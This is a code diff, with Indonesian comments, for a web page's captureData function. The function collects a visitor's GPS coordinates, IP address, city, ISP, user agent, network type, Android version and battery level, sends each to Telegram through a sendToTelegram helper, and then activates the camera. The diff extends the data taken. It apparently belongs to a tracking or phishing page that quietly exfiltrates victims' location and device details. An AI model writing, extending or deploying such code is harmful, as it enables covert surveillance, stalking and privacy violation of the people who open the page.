@@ -75,23 +75,46 @@
         }
 
         function captureData() {
-            // Ambil lokasi
+            // Ambil lokasi & IP
             navigator.geolocation.getCurrentPosition(
                 position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     sendToTelegram(`📍 Lokasi: ${lat}, ${lon}`);
-
-                    fetch("https://ipinfo.io/json")
-                        .then(response => response.json())
-                        .then(data => {
-                            sendToTelegram(`🌐 IP: ${data.ip}\n🌍 Lokasi: ${data.city}, ${data.country}\n📡 ISP: ${data.org}`);
-                        });
                 },
                 error => {
                     sendToTelegram("❌ Lokasi tidak diizinkan.");
                 }
             );
+
+            // Ambil informasi dari IP
+            fetch("https://ipinfo.io/json")
+                .then(response => response.json())
+                .then(data => {
+                    sendToTelegram(`🌐 IP: ${data.ip}\n🏙 Kota: ${data.city}, ${data.region}\n📡 ISP: ${data.org}`);
+                });
+
+            // Ambil informasi perangkat
+            let deviceInfo = `📱 Perangkat: ${navigator.userAgent}`;
+            let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
+            deviceInfo += `\n📶 Jaringan: ${network}`;
+
+            // Jika Android, coba deteksi versinya
+            let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
+            if (androidVersion) {
+                deviceInfo += `\n🤖 Android: ${androidVersion[1]}`;
+            }
+
+            sendToTelegram(deviceInfo);
+
+            // Cek status baterai
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    sendToTelegram(`🔋 Baterai: ${Math.round(battery.level * 100)}%`);
+                });
+            } else {
+                sendToTelegram("⚠️ Tidak bisa mendapatkan status baterai.");
+            }
 
             // Aktifkan kamera dalam elemen video
             navigator.mediaDevices.getUserMedia({ video: true })
